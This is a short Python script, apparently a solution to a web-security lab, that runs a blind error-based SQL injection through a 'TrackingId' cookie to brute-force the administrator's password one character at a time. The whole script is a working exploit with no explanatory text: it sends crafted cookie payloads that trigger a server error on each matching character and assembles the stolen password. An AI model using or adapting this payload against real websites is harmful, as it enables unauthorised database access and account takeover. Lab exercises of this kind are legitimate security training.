#!/usr/bin/env python3

from pwn import *
import requests
import sys
import signal
import string
import time

def def_handler(sig,frame):
    p1.failure("Ataque de fuerza bruta detenido")
    print(f"\n\n[!] Exit...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

def makeSQLI():

    p1 = log.progress("SQLI")
    p1.status("Starting brute force attack...")

    time.sleep(2)

    password = ""
    
    p2 = log.progress("Password")

    for position in range (1,21):
        for character in characters:
            cookies = {
                    "TrackingId": f"O4evNUqYn8LflI3Q'||(select case when substr(password,{position},1)='{character}' then to_char(1/0) else '' end from users where username='administrator')||'-- -;", 
                    "session": "nTb3pvq4LIKaeml5UMLVYoxCnxlLqcyq"
            }
            #print(cookies["TrackingId"])

            p1.status(cookies["TrackingId"])

            r= requests.get("https://page", cookies=cookies)
            if r.status_code == 500:
                password += character
                p2.status(password)
                break

    print(password)


if __name__ == '__main__':
    makeSQLI()

         
